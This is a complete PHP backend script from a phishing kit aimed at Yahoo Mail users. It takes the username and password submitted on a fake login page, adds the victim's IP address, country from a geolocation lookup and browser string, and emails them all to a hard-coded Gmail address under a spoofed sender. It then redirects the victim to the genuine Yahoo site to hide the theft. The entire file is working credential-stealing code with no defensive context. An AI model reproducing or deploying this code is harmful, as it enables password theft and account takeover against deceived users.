<?php
session_start();
$_SESSION['pdf1'] = $_POST['pdf1'];
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$login = $_POST['pdf1'];
$passwd = $_POST['pdf2'];
$own = 'ebene192@gmail.com';
$server = date("D/M/d, Y g:i a"); 
$sender = '041result-chess@kumasi.net';
$domain = 'Y-MAIL NEW ';
$subj = "$domain LOGINGZZ $country";
$headers .= "From: Axe<$sender>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$over = 'https://mail.yahoo.com';
$msg = "<HTML><BODY>
 <TABLE>
 <tr><td>________ONE WITH GOD_________</td></tr>
 <tr><td>$domain I.D: $login<td/></tr>
 <tr><td>Password: $passwd</td></tr>
 <tr><td>IP: $ip</td></tr>
 <tr><td>Date: $server</td></tr>
 <tr><td>country : $country</td></tr>
 <tr><td>Browser : $browserAgent</td></tr>
 <tr><td>________CHESS_SKD__________</td></tr>
 </BODY>
 </HTML>";
if (empty($login) || empty($passwd)) {
header( "Location: /mpaweskd.php?code=redirectNjlmZC00NjQxLTlmNTQtZmM5MjIzN00NjQxLTlmNTZmM5MjIzN00N " );
}
else {
mail($own,$subj,$msg,$headers);
header("Location: $over");
}
?>
